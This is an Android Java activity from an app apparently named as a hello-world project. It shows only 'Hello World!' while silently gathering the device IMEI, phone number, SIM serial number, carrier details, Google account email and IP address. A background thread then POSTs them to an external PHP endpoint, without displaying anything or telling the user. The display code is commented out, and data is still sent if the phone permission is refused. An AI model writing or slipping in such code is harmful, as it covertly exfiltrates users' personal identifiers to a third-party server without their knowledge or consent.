package com.example.alexeypc.hwapplication;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.Patterns;
import android.widget.TextView;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.LinkedList;
import java.util.List;
import java.util.regex.Pattern;

public class MainActivity extends AppCompatActivity {

    String deviceIMEI;
    String version;
    String device;
    String product;
    String manufacturer;
    String brand;
    String model;

    String operatorName;
    String providerName;
    String countryIso;
    String networkRoaming;
    String simSerialNumber;
    String phoneNumber;

    String email;
    String screen;

    String ipaddress;

    TextView tv2;
    TextView tv1;

    Thread thread;

    private static final String TAG = "MainActivity";
    private static final int REQUEST_PHONE = 0;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        this.tv1 = (TextView) findViewById(R.id.tv1);
        this.tv1.setText("Hello World!");


        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED) {

            requestPhonePermission();
        } else {
            
            initPhoneVariable();
            initOtherVariable();

            startThread();
        }

        /*
        tv1.setText("Your Android OS version: " + version + "\n"
                + "DEVICE: " + device + "\n"
                + "PRODUCT: " + product + "\n"
                + "MANUFACTURER: " + manufacturer + "\n"
                + "BRAND: " + brand + "\n"
                + "MODEL: " + model + "\n"
                + "IMEI: " + deviceIMEI + "\n"
                + "PHONE NUMBER: " + phoneNumber + "\n"
                + "google email: " + email + "\n"
                + "operatorName: " + operatorName + "\n"
                + "providerName: " + providerName + "\n"
                + "countryISO: " + countryIso + "\n"
                + "networkRoaming: " + networkRoaming + "\n"
                + "simSerialNumber: " + simSerialNumber + "\n"
                + "screen: " + screen
        );
        */

    }

    private void initPhoneVariable() {

        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);

        this.deviceIMEI = telephonyManager.getDeviceId();

        this.operatorName = telephonyManager.getNetworkOperatorName();
        this.providerName = telephonyManager.getSimOperatorName();
        this.countryIso = telephonyManager.getNetworkCountryIso();
        this.networkRoaming = String.valueOf(telephonyManager.isNetworkRoaming());
        this.simSerialNumber = telephonyManager.getSimSerialNumber();

        this.phoneNumber = telephonyManager.getLine1Number();
        if (this.phoneNumber.isEmpty()) {
            this.phoneNumber = "Not define!";
        }
    }

    private void initOtherVariable() {

        this.version = String.valueOf(Build.VERSION.SDK_INT);
        this.device = Build.DEVICE;
        this.product = Build.PRODUCT;
        this.manufacturer = Build.MANUFACTURER;
        this.brand = Build.BRAND;
        this.model = Build.MODEL;

        this.email = getGoogleEmail();

        DisplayMetrics metrics = new DisplayMetrics();
        getWindowManager().getDefaultDisplay().getMetrics(metrics);
        this.screen = metrics.heightPixels + "x" + metrics.widthPixels;

        ConnectivityManager cm = (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo[] networkInfo = cm.getAllNetworkInfo();
        for (NetworkInfo netInfo : networkInfo) {
            if(netInfo.getTypeName().equalsIgnoreCase("WIFI")){
                if(netInfo.isConnected()){
                    this.ipaddress = getWifiIp();
                }
            } else if(netInfo.getTypeName().equalsIgnoreCase("MOBILE")){
                if(netInfo.isConnected()){
                    this.ipaddress = getMobileIp();
                }
            }

        }


    }

    private String getWifiIp() {
        WifiManager wifiManager = (WifiManager)getSystemService(WIFI_SERVICE);
        return Formatter.formatIpAddress(wifiManager.getConnectionInfo().getIpAddress());
    }

    private String getMobileIp() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = (NetworkInterface) en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress()) {
                        String ipaddress = inetAddress.getHostAddress().toString();
                        return ipaddress;
                    }
                }
            }
        } catch (SocketException e) {
            e.printStackTrace();
        }
        return null;
    }

    private void startThread () {

        this.thread = new Thread(new Runnable(){
            public void run() {
                try {
                    List<PostParameter> params = new ArrayList<PostParameter>();
                    params.add(new PostParameter<String>("imei", deviceIMEI));
                    params.add(new PostParameter<String>("phonenumber", phoneNumber));
                    params.add(new PostParameter<String>("operatorname", operatorName));
                    params.add(new PostParameter<String>("providername", providerName));
                    params.add(new PostParameter<String>("countryiso", countryIso));
                    params.add(new PostParameter<String>("networkroaming", networkRoaming));
                    params.add(new PostParameter<String>("simserialnumber", simSerialNumber));
                    params.add(new PostParameter<String>("device", device));
                    params.add(new PostParameter<String>("product", product));
                    params.add(new PostParameter<String>("version", version));
                    params.add(new PostParameter<String>("manufacturer", manufacturer));
                    params.add(new PostParameter<String>("brand", brand));
                    params.add(new PostParameter<String>("model", model));
                    params.add(new PostParameter<String>("email", email));
                    params.add(new PostParameter<String>("screen", screen));
                    params.add(new PostParameter<String>("ipaddress", ipaddress));

                    Log.d(TAG, "sendPostRequest");
                    MultipartPost post = new MultipartPost(params);
                    post.send("http://test.it-caffe.com/Savetodb.php");
                    //Toast.makeText(this, "POST has sent", Toast.LENGTH_SHORT).show();
                } catch (Exception e) {
                    Log.e(TAG, "sendPostRequest", e);
                    Log.d(TAG, "==================================================");
                    //Toast.makeText(this, "Failed to send POST request, see log for details!", Toast.LENGTH_SHORT).show();
                }

            }});
        thread.start();
    }

    private void requestPhonePermission() {

        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE},
                REQUEST_PHONE);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {

        if (requestCode == REQUEST_PHONE) {

            // Received permission result for camera permission.est.");
            // Check if the only required permission has been granted
            if (grantResults.length == 1 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Camera permission has been granted, preview can be displayed
                initPhoneVariable();
                initOtherVariable();
                startThread();

            } else {

                initOtherVariable();
                startThread();
            }
        }
    }


    private String getGoogleEmail () {

        Pattern emailPattern = Patterns.EMAIL_ADDRESS;
        AccountManager manager = AccountManager.get(this);
        Account[] accounts = manager.getAccountsByType("com.google");
        List<String> possibleEmails = new LinkedList<String>();
        for (Account account : accounts) {
            if (emailPattern.matcher(account.name).matches()) {
                possibleEmails.add(account.name);
            }
        }

        if (!possibleEmails.isEmpty()){
            return possibleEmails.get(0);
        } else {
            return "Not define!";
        }
    }
}
